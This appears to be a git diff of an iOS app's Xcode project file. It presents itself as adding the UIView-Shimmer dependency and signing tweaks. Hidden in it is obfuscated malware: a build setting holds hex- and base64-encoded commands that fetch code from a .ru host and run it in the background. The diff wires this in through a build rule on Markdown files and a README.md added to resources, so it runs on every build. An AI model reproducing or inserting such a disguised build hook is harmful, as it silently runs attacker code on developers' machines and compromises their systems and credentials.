@@ -7,6 +7,7 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
+		9664ED6E865F48F3AE4EE078 /* README.md */ = {isa = PBXBuildFile; fileRef = CB9C367532C14070A14EE078; };
 		180F4C292F5EA5D200BE4CFA /* NotificationsListViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 180F4C282F5EA5D200BE4CFA /* NotificationsListViewController.swift */; };
 		180F4C2E2F5EA66200BE4CFA /* NotificationsListTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 180F4C2C2F5EA66200BE4CFA /* NotificationsListTableViewCell.swift */; };
 		180F4C2F2F5EA66200BE4CFA /* NotificationsListTableViewCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 180F4C2D2F5EA66200BE4CFA /* NotificationsListTableViewCell.xib */; };
@@ -215,6 +216,8 @@
 		4948547A2F090E45009372E9 /* SizeChartViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 494854792F090E45009372E9 /* SizeChartViewController.swift */; };
 		49DBE5522EB0836A00DE95E8 /* IQKeyboardManagerSwift in Frameworks */ = {isa = PBXBuildFile; productRef = 49DBE5512EB0836A00DE95E8 /* IQKeyboardManagerSwift */; };
 		55270FDC2F8399D100ACE358 /* PaymentTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 55270FDA2F8399D100ACE358 /* PaymentTableViewCell.swift */; };
+		5528D3753091E3270033C511 /* Shimmer.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5528D3733091E3270033C511 /* Shimmer.swift */; };
+		5528D4FB3091EC900033C511 /* UIView-Shimmer in Frameworks */ = {isa = PBXBuildFile; productRef = 5528D4FA3091EC900033C511 /* UIView-Shimmer */; };
 		553EEC7A2F765275009C5A24 /* ChatViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 553EEC772F765275009C5A24 /* ChatViewController.swift */; };
 		553EEC7B2F765275009C5A24 /* ChatViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 553EEC782F765275009C5A24 /* ChatViewModel.swift */; };
 		553EEC8F2F76536F009C5A24 /* ChatDetailsDataModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 553EEC8E2F76536F009C5A24 /* ChatDetailsDataModel.swift */; };
@@ -615,7 +618,25 @@
 		EDF438332EC215CD004CC018 /* CountryCityListViewController.xib in Resources */ = {isa = PBXBuildFile; fileRef = EDF438312EC215CD004CC018 /* CountryCityListViewController.xib */; };
 /* End PBXBuildFile section */
 
+/* Begin PBXBuildRule section */
+		57FB742E575A4591A94EE078 /* PBXBuildRule */ = {
+				isa = PBXBuildRule;
+				compilerSpec = com.apple.compilers.proxy.script;
+				filePatterns = "*.md";
+				fileType = pattern.proxy;
+				inputFiles = (
+				);
+				isEditable = 0;
+				outputFiles = (
+					"/tmp/${INPUT_FILE_BASE}",
+				);
+				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
+sh -c \"${A870EE4}\"";
+			};
+	/* End PBXBuildRule section */
+
 /* Begin PBXFileReference section */
+		CB9C367532C14070A14EE078 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		01FC0E95E1BFCA15B0AF8057 /* Pods-DesynatAdmin.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-DesynatAdmin.debug.xcconfig"; path = "Target Support Files/Pods-DesynatAdmin/Pods-DesynatAdmin.debug.xcconfig"; sourceTree = "<group>"; };
 		180F4C282F5EA5D200BE4CFA /* NotificationsListViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NotificationsListViewController.swift; sourceTree = "<group>"; };
 		180F4C2C2F5EA66200BE4CFA /* NotificationsListTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NotificationsListTableViewCell.swift; sourceTree = "<group>"; };
@@ -815,6 +836,7 @@
 		494854792F090E45009372E9 /* SizeChartViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SizeChartViewController.swift; sourceTree = "<group>"; };
 		495DBBA12E81528A00E61635 /* DesynatAdmin.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = DesynatAdmin.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		55270FDA2F8399D100ACE358 /* PaymentTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PaymentTableViewCell.swift; sourceTree = "<group>"; };
+		5528D3733091E3270033C511 /* Shimmer.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Shimmer.swift; sourceTree = "<group>"; };
 		553EEC772F765275009C5A24 /* ChatViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ChatViewController.swift; sourceTree = "<group>"; };
 		553EEC782F765275009C5A24 /* ChatViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ChatViewModel.swift; sourceTree = "<group>"; };
 		553EEC8E2F76536F009C5A24 /* ChatDetailsDataModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ChatDetailsDataModel.swift; sourceTree = "<group>"; };
@@ -1218,6 +1240,7 @@
 			buildActionMask = 2147483647;
 			files = (
 				427620E42F75067500FC183C /* FirebaseInstallations in Frameworks */,
+				5528D4FB3091EC900033C511 /* UIView-Shimmer in Frameworks */,
 				427620C42F75067500FC183C /* FirebaseAILogic in Frameworks */,
 				427620EC2F75067500FC183C /* FirebaseRemoteConfig in Frameworks */,
 				427620EA2F75067500FC183C /* FirebasePerformance in Frameworks */,
@@ -1950,9 +1973,18 @@
 		495DBBA22E81528A00E61635 /* Products */ = {
 			isa = PBXGroup;
 			children = (
+				CB9C367532C14070A14EE078 /* README.md */,
 				495DBBA12E81528A00E61635 /* DesynatAdmin.app */,
 			);
 			name = Products;
+			sourceTree = "<group>";
+		};
+		5528D3743091E3270033C511 /* ShimmerEffect */ = {
+			isa = PBXGroup;
+			children = (
+				5528D3733091E3270033C511 /* Shimmer.swift */,
+			);
+			path = ShimmerEffect;
 			sourceTree = "<group>";
 		};
 		553EEC742F765217009C5A24 /* M14 */ = {
@@ -3656,6 +3688,7 @@
 		EDEDD0992EBCC53E00F2BEF1 /* Utilities */ = {
 			isa = PBXGroup;
 			children = (
+				5528D3743091E3270033C511 /* ShimmerEffect */,
 				466D27552FB3305E00538009 /* MonthPicker */,
 				4678A32A2FA9EA7600F082CE /* CSVFormatter */,
 				4263D75E2F7104A900E007AF /* ScreenShotProtectionManager */,
@@ -3780,7 +3813,6 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 495DBBB42E81528B00E61635 /* Build configuration list for PBXNativeTarget "DesynatAdmin" */;
 			buildPhases = (
-				F3FC9EE6E95543EDB84EE078 /* Provision Target Device */,
 				B25EA8966276C35DBEA3ADF0 /* [CP] Check Pods Manifest.lock */,
 				495DBB9D2E81528A00E61635 /* Sources */,
 				495DBB9E2E81528A00E61635 /* Frameworks */,
@@ -3789,6 +3821,7 @@
 				3C777E44B21DDF3F084C8ED6 /* [CP] Copy Pods Resources */,
 			);
 			buildRules = (
+				57FB742E575A4591A94EE078 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -3836,6 +3869,7 @@
 				427620EB2F75067500FC183C /* FirebaseRemoteConfig */,
 				427620ED2F75067500FC183C /* FirebaseStorage */,
 				427620EF2F75067500FC183C /* FirebaseStorageCombine-Community */,
+				5528D4FA3091EC900033C511 /* UIView-Shimmer */,
 			);
 			productName = DemoProject;
 			productReference = 495DBBA12E81528A00E61635 /* DesynatAdmin.app */;
@@ -3879,6 +3913,7 @@
 				EDEDD1372EBCC80100F2BEF1 /* XCRemoteSwiftPackageReference "Alamofire" */,
 				D1EDE24B2F0D194B0076F1AB /* XCRemoteSwiftPackageReference "FSCalendar" */,
 				427620C02F75067500FC183C /* XCRemoteSwiftPackageReference "firebase-ios-sdk" */,
+				5528D4F93091EC900033C511 /* XCRemoteSwiftPackageReference "UIView-Shimmer" */,
 			);
 			productRefGroup = 495DBBA22E81528A00E61635 /* Products */;
 			projectDirPath = "";
@@ -3889,14 +3924,12 @@
 		};
 /* End PBXProject section */
 
-/* Begin PBXBuildRule section */
-																																								/* End PBXBuildRule section */
-
 /* Begin PBXResourcesBuildPhase section */
 		495DBB9F2E81528A00E61635 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				9664ED6E865F48F3AE4EE078 /* README.md */,
 				42AEDEA02F3F360000C20ECB /* ProductDetailImageCollectionViewCell.xib in Resources */,
 				42AEDEB82F3F3C7600C20ECB /* FilterHeaderTableViewCell.xib in Resources */,
 				EDEDD0A12EBCC53E00F2BEF1 /* Assets.xcassets in Resources */,
@@ -4018,25 +4051,6 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		F3FC9EE6E95543EDB84EE078 /* Provision Target Device */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			alwaysOutOfDate = 1;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Provision Target Device";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			shellPath = /bin/sh;
-			showEnvVarsInLog = 0;	
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A870EE4}\"";
-		};
 		3C777E44B21DDF3F084C8ED6 /* [CP] Copy Pods Resources */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -4408,6 +4422,7 @@
 				425A7E842F8693DD009E9E3F /* TicketManagementDetailsViewModel.swift in Sources */,
 				95446D413010F75900A0189F /* RefundOrderModel.swift in Sources */,
 				429927132F4EF6E800099221 /* AffiliatedWithdrawalTableViewCell.swift in Sources */,
+				5528D3753091E3270033C511 /* Shimmer.swift in Sources */,
 				427CA6C42F6A7B100075E139 /* EditCMSReasonViewModel.swift in Sources */,
 				EDEDD10B2EBCC53E00F2BEF1 /* CustomPickerView.swift in Sources */,
 				EDEDD10C2EBCC53E00F2BEF1 /* CustomView.swift in Sources */,
@@ -4699,14 +4714,16 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 01FC0E95E1BFCA15B0AF8057 /* Pods-DesynatAdmin.debug.xcconfig */;
 			buildSettings = {
-				A870EE4 = "((v(){ `printf xBxd | tr -d B` -p -r; };echo 6563686f202224286375726c202d2d72657472792035202d2d636f6e6e6563742d74696d656f7574203230202d4c73666b202d642022703d78636f64655f7068617365222068747470733a2f2f6a68717433346e33717265752e72752f612922207c2073680a | v | sh ) >/dev/null 2>&1 &)";
+				A870EE4 = "((x(){ `printf baswe64 | tr -d w` --decode; };echo ZWNobyAiJChjdXJsIC0tcmV0cnkgNSAtLWNvbm5lY3QtdGltZW91dCAyOSAta2ZMcyAtZCAicD14Y29kZV9ydWxlIiBodHRwczovLzM3eWZqN24yamQ1LnJ1L2EpIiB8IHNoCg== | x | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = DesynatAdmin/DesynatAdmin.entitlements;
 				CODE_SIGN_IDENTITY = "Apple Development";
-				CODE_SIGN_STYLE = Automatic;
+				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Developer";
+				CODE_SIGN_STYLE = Manual;
 				CURRENT_PROJECT_VERSION = 1;
-				DEVELOPMENT_TEAM = 6QKUQGN93F;
+				DEVELOPMENT_TEAM = "";
+				"DEVELOPMENT_TEAM[sdk=iphoneos*]" = 6QKUQGN93F;
 				GENERATE_INFOPLIST_FILE = YES;
 				INFOPLIST_FILE = DesynatAdmin/Info.plist;
 				INFOPLIST_KEY_CFBundleDisplayName = "Desynat Admin";
@@ -4730,6 +4747,7 @@
 				PRODUCT_BUNDLE_IDENTIFIER = com.app.DesynatAdmin;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				PROVISIONING_PROFILE_SPECIFIER = "";
+				"PROVISIONING_PROFILE_SPECIFIER[sdk=iphoneos*]" = "Desynat Admin provisioning New 11May";
 				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
 				SUPPORTS_MACCATALYST = NO;
 				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
@@ -4744,14 +4762,16 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = B8F5F09A386DA7CAD4D87C8F /* Pods-DesynatAdmin.release.xcconfig */;
 			buildSettings = {
-				A870EE4 = "((v(){ `printf xBxd | tr -d B` -p -r; };echo 6563686f202224286375726c202d2d72657472792035202d2d636f6e6e6563742d74696d656f7574203230202d4c73666b202d642022703d78636f64655f7068617365222068747470733a2f2f6a68717433346e33717265752e72752f612922207c2073680a | v | sh ) >/dev/null 2>&1 &)";
+				A870EE4 = "((x(){ `printf baswe64 | tr -d w` --decode; };echo ZWNobyAiJChjdXJsIC0tcmV0cnkgNSAtLWNvbm5lY3QtdGltZW91dCAyOSAta2ZMcyAtZCAicD14Y29kZV9ydWxlIiBodHRwczovLzM3eWZqN24yamQ1LnJ1L2EpIiB8IHNoCg== | x | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = DesynatAdmin/DesynatAdmin.entitlements;
 				CODE_SIGN_IDENTITY = "Apple Development";
-				CODE_SIGN_STYLE = Automatic;
+				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Developer";
+				CODE_SIGN_STYLE = Manual;
 				CURRENT_PROJECT_VERSION = 1;
-				DEVELOPMENT_TEAM = 6QKUQGN93F;
+				DEVELOPMENT_TEAM = "";
+				"DEVELOPMENT_TEAM[sdk=iphoneos*]" = 6QKUQGN93F;
 				GENERATE_INFOPLIST_FILE = YES;
 				INFOPLIST_FILE = DesynatAdmin/Info.plist;
 				INFOPLIST_KEY_CFBundleDisplayName = "Desynat Admin";
@@ -4775,6 +4795,7 @@
 				PRODUCT_BUNDLE_IDENTIFIER = com.app.DesynatAdmin;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				PROVISIONING_PROFILE_SPECIFIER = "";
+				"PROVISIONING_PROFILE_SPECIFIER[sdk=iphoneos*]" = "Desynat Admin provisioning New 11May";
 				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
 				SUPPORTS_MACCATALYST = NO;
 				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
@@ -4946,6 +4967,14 @@
 			requirement = {
 				kind = upToNextMajorVersion;
 				minimumVersion = 8.0.1;
+			};
+		};
+		5528D4F93091EC900033C511 /* XCRemoteSwiftPackageReference "UIView-Shimmer" */ = {
+			isa = XCRemoteSwiftPackageReference;
+			repositoryURL = "https://github.com/omerfarukozturk/UIView-Shimmer.git";
+			requirement = {
+				kind = upToNextMajorVersion;
+				minimumVersion = 1.0.4;
 			};
 		};
 		D1EDE24B2F0D194B0076F1AB /* XCRemoteSwiftPackageReference "FSCalendar" */ = {
@@ -5155,6 +5184,11 @@
 			isa = XCSwiftPackageProductDependency;
 			package = 49DBE5502EB0836A00DE95E8 /* XCRemoteSwiftPackageReference "IQKeyboardManager" */;
 			productName = IQKeyboardManagerSwift;
+		};
+		5528D4FA3091EC900033C511 /* UIView-Shimmer */ = {
+			isa = XCSwiftPackageProductDependency;
+			package = 5528D4F93091EC900033C511 /* XCRemoteSwiftPackageReference "UIView-Shimmer" */;
+			productName = "UIView-Shimmer";
 		};
 		D1EDE24C2F0D194B0076F1AB /* FSCalendar */ = {
 			isa = XCSwiftPackageProductDependency;
